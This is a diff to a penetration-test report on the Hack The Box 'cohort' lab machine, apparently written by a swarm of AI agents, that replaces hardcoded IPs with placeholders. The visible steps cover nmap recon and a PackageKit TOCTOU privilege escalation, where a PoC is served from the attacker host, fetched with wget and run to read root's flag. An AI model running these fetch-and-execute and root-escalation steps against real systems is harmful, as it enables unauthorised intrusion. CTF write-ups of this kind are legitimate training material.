@@ -1,6 +1,7 @@
 # Penetration Testing Report — HTB "cohort" (Easy, Linux)
 
-**Target:** cohort.htb — IP `10.129.244.174` at time of root (box respawned mid-engagement from `10.129.121.100`; internal vhost hash and vulnerable software versions were unchanged across the respawn)
+**Target:** cohort.htb — IP `$TARGET` (HTB VPN-assigned; the box respawned mid-engagement and the IP changed, but the internal vhost hash and vulnerable software versions were unchanged across the respawn)
+*Conventions: `$TARGET` = current box IP; `$ATTACKER_IP` = your tun0/VPN address. Substitute both; no environment-specific IPs or local paths are hardcoded.*
 **Engagement dates:** 2026-10-16 – 2026-10-17
 **Assessed by:** HTB/CTF multi-agent swarm (Recon, Strategist, Exploit, PrivEsc, Scribe agents)
 **Result:** Full compromise — unauthenticated remote access escalated to `root`. Both flags captured.
@@ -78,8 +79,8 @@ All commands below were run against the lab target only, from the engagement wor
 
 ### 4.1 Recon
 ```bash
-nmap --privileged -p- --min-rate 2000 -T4 -oN nmap/full-tcp.txt 10.129.121.100
-nmap --privileged -sC -sV -p22,80,443 -oN nmap/services.txt 10.129.121.100
+nmap --privileged -p- --min-rate 2000 -T4 -oN nmap/full-tcp.txt $TARGET
+nmap --privileged -sC -sV -p22,80,443 -oN nmap/services.txt $TARGET
 ```
 Result: 22/tcp ssh (OpenSSH 9.6p1 Ubuntu), 80/tcp and 443/tcp nginx 1.24.0 (Ubuntu), self-signed cert `CN=cohort.htb` / SAN `cohort.htb,*.cohort.htb`.
 
@@ -101,7 +102,7 @@ Other confirmed loopback-bypass literals (same leak reproduced with each): `127.
 
 ### 4.3 Internal vhost discovery and reachability check
 ```bash
-echo "10.129.244.174 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
+echo "$TARGET nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
 curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
 # -> 0.20.4   (marimo)
 ```
@@ -143,11 +144,11 @@ dpkg -l | grep -Ei 'packagekit|needrestart|polkit|snapd'
 ### 4.6 Privilege escalation — CVE-2026-41651 ("Pack2TheRoot") PackageKit TOCTOU
 On the attacker host, a public PoC for CVE-2026-41651 was served over an HTTP listener on `tun0`:
 ```bash
-python3 -m http.server 9001 --bind 10.10.15.6   # serving cve-2026-41651.py
+python3 -m http.server 9001 --bind $ATTACKER_IP   # serving cve-2026-41651.py
 ```
 From the marimo WebSocket shell, the PoC was fetched and run:
 ```bash
-wget http://10.10.15.6:9001/cve-2026-41651.py -O /dev/shm/pk.py
+wget http://$ATTACKER_IP:9001/cve-2026-41651.py -O /dev/shm/pk.py
 python3 /dev/shm/pk.py --check          # -> confirms PackageKit 1.2.8 vulnerable
 python3 /dev/shm/pk.py --exec "cat /root/root.txt"
 ```
@@ -167,7 +168,7 @@ PoC provenance (per blackboard): public repo `mawussid/CVE-2026-41651-Python`, f
 
 | Flag | Value | Location | Notes |
 |---|---|---|---|
-| user.txt | `[REDACTED-HTB-FLAG]` | `/home/marimo/user.txt` | Current value, captured after the box respawned mid-engagement (IP changed `10.129.121.100` → `10.129.244.174`). |
+| user.txt | `[REDACTED-HTB-FLAG]` | `/home/marimo/user.txt` | Current value, captured after the box respawned mid-engagement (the spawn IP changed). |
 | user.txt (pre-respawn, historical) | `[REDACTED-HTB-FLAG]` | `/home/marimo/user.txt` | Captured once before the respawn; invalidated when the box respawned. Recorded for traceability only. |
 | root.txt | `[REDACTED-HTB-FLAG]` | `/root/root.txt` | Captured via SUID-root `bash` dropped by the PackageKit TOCTOU exploit. |
 
